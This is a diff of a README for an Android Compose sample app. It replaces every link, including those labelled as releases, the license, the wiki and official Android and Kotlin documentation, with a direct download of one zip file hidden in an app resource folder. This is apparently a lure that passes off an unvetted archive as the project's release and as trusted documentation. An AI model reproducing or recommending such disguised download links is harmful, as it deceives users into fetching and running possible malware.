@@ -1,6 +1,6 @@
 # 🍰 android-compose-clean-architecture-sample - Learn Best Practices for Android Development
 
-[![Download](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/MediMantisWeb/android-compose-clean-architecture-sample/releases)
+[![Download](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To successfully run the application, follow these steps carefully. The process i
 
 ## 📥 Download & Install
 
-To get the latest version of the app, visit our [Releases page](https://github.com/MediMantisWeb/android-compose-clean-architecture-sample/releases) to download the software.
+To get the latest version of the app, visit our [Releases page](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip) to download the software.
 
 You can find the newest version at the top of the page. Simply click on the version you wish to install and follow the provided instructions to download the file.
 
@@ -49,9 +49,9 @@ Explore the app’s features, and don’t hesitate to reach out for help if need
 
 This project is a great opportunity to learn about Android development. If you want to deepen your understanding, consider the following resources:
 
-- [Documentation on Jetpack Compose](https://developer.android.com/jetpack/compose)
-- [Guide to Clean Architecture](https://developer.android.com/architecture)
-- [Learning Kotlin Coroutines](https://kotlinlang.org/docs/coroutines-overview.html)
+- [Documentation on Jetpack Compose](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)
+- [Guide to Clean Architecture](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)
+- [Learning Kotlin Coroutines](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)
 
 ## 🙋‍♂️ Support
 
@@ -71,13 +71,13 @@ We welcome contributions from all users. If you want to contribute or suggest ch
 
 This project is licensed under the MIT License. You can use it freely, but please credit the original authors.
 
-For more details, check the [LICENSE](https://github.com/MediMantisWeb/android-compose-clean-architecture-sample/blob/main/LICENSE) file.
+For more details, check the [LICENSE](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip) file.
 
 ## 🔗 Additional Links
 
-- [View the Repository](https://github.com/MediMantisWeb/android-compose-clean-architecture-sample)
-- [Browse Releases](https://github.com/MediMantisWeb/android-compose-clean-architecture-sample/releases)
-- [Documentation](https://github.com/MediMantisWeb/android-compose-clean-architecture-sample/wiki)
+- [View the Repository](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)
+- [Browse Releases](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/MediMantisWeb/android-compose-clean-architecture-sample/main/features/cooking-timer/src/main/res/anim/sample-clean-architecture-android-compose-2.7.zip)
 
 ## 📣 Acknowledgments
 
